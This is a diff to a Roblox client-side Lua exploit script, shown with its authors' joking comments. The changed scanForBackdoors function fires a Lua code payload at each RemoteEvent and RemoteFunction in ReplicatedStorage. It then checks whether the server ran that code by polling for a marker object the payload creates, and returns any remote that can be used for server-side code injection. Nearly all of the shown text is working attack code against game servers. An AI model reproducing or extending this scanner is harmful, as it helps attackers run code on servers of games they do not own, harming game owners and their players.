@@ -9,43 +9,87 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
 local foundRemote = nil
 local injected = false
 
---Feima talk alot about this topic too many times and thanks
+--Feima here, so um I did update this part and added some comment because memory ok
 local function scanForBackdoors()
-    local foundRemotes = {}
-    local markerId = "Marker_" .. tostring(math.random(100000,999999))
-    for _, obj in pairs(game:GetDescendants()) do
-        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            if obj.Parent == game:GetService("ReplicatedStorage") then
-                if obj.Name == "DefaultChatSystemChatEvents" then
-                    continue
-                end
-                if obj.Parent.Name == "DefaultChatSystemChatEvents" then
-                    continue
-                end
-                if string.find(obj:GetFullName(), "RobloxReplicatedStorage") then
-                    continue
-                end
-                local testCommand = "print('It worked! Wow.')" 
-                if obj:IsA("RemoteEvent") then
-                    obj:FireServer(testCommand)
-                else
-                    spawn(function()
-                        pcall(function() obj:InvokeServer(testCommand) end)
-                    end)
-                end
-                table.insert(foundRemotes, obj)
+    ---scan only remotes in RS and verify execute to create mark
+    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
+        if not (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
+            continue
+        end
+
+        if obj.Name == "DefaultChatSystemChatEvents" then
+            continue
+        end
+        if obj.Parent and obj.Parent.Name == "DefaultChatSystemChatEvents" then
+            continue
+        end
+        if string.find(obj:GetFullName(), "RobloxReplicatedStorage") then
+            continue
+        end
+
+        --maker name part dont mind this
+        local markerId = "Marker_" .. HttpService:GenerateGUID(false):gsub("-", "")
+        --payload; when executed on the server it will create a BoolValue marker on RS
+        local payload = ([[pcall(function()
+    local rs = game:GetService("ReplicatedStorage")
+    local w = game:GetService("Workspace")
+    local v = Instance.new("BoolValue")
+    v.Name = "%s"
+    v.Value = true
+    v.Parent = rs
+    --putted fallback in workspace if server restricted RS writes
+    local v2 = Instance.new("BoolValue")
+    v2.Name = "%s"
+    v2.Value = true
+    v2.Parent = w
+end)]]):format(markerId, markerId)
+
+        --send payload (pcall avoid error)
+        if obj:IsA("RemoteEvent") then
+            pcall(function() obj:FireServer(payload) end)
+        else
+            --RemoteFunction invoke maybe will block, ill put safe pcall right here and avoid halt
+            spawn(function()
+                pcall(function() obj:InvokeServer(payload) end)
+            end)
+        end
+
+        --wait a short time for server to execute payload + marker creation
+        local timeout = 0.7
+        local elapsed = 0
+        local found = nil
+        while elapsed < timeout do
+            if ReplicatedStorage:FindFirstChild(markerId) then
+                found = ReplicatedStorage:FindFirstChild(markerId)
+                break
             end
+            if Workspace:FindFirstChild(markerId) then
+                found = Workspace:FindFirstChild(markerId)
+                break
+            end
+            task.wait(0.1)
+            elapsed = elapsed + 0.1
+        end
+
+        if found then
+            --cleanup marker
+            if ReplicatedStorage:FindFirstChild(markerId) then
+                pcall(function() ReplicatedStorage[markerId]:Destroy() end)
+            end
+            if Workspace:FindFirstChild(markerId) then
+                pcall(function() Workspace[markerId]:Destroy() end)
+            end
+            --return the remote that successfully when execute payload
+            return obj
         end
     end
-    wait(1)
-    for _, remote in pairs(foundRemotes) do
-        return remote
-    end
+
     return nil
 end
 
@@ -527,7 +571,7 @@ toggleButton.MouseButton1Click:Connect(function()
  end
 end)
 
--- Welcome notification
+--Notify lololo
 task.wait(1)
 local notification = Instance.new("Frame")
 notification.Size = UDim2.new(0, 400, 0, 100)
@@ -604,3 +648,5 @@ warn("Testing warn")
 --Ices did the moving outline.
 
 print("Thanks!")
+
+--Notes: Dude Feima what knowledge u have ;crying;
